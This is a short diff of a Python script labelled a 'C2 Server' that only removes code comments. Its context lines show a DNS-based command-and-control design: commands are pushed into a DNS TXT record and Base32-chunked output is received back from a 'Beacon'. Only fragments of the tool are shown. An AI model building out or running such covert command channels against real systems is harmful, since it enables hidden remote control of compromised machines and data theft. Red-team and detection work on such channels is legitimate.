@@ -60,7 +60,7 @@ def decode_base32(data):
     Decode Base32 data to string, fixing padding issues.
     """
     try:
-        # Add padding to make the length a multiple of 8
+        
         padding = len(data) % 8
         if padding != 0:
             data += "=" * (8 - padding)
@@ -106,13 +106,13 @@ def listen_for_dns_packets():
                         if decoded_output:
                             cleaned_output = decoded_output.split("|", 1)[-1].strip()
                             print(colored(f"\nDecoded output from Beacon:\n{cleaned_output}\n", "green", attrs=["bold"]))
-                        break  # Exit listening to allow next command input
+                        break  
                     except Exception as e:
                         log(f"Error decoding or assembling chunks: {e}", "ERROR")
-                        break  # Exit on error to allow next command input
+                        break  
                 else:
                     log(f"Incomplete chunks received. Expected {expected_chunks}, got {len(chunks)}.", "ERROR")
-                    break  # Exit to allow next command input
+                    break  
 
 
 if __name__ == "__main__":
@@ -129,7 +129,7 @@ if __name__ == "__main__":
             update_txt_record(encoded_command)
             sync_bind()
 
-            listen_for_dns_packets()  # Start listening for DNS packets
+            listen_for_dns_packets() 
         except KeyboardInterrupt:
             log(colored("\nExiting C2 Server.", "yellow", attrs=["bold"]))
             break
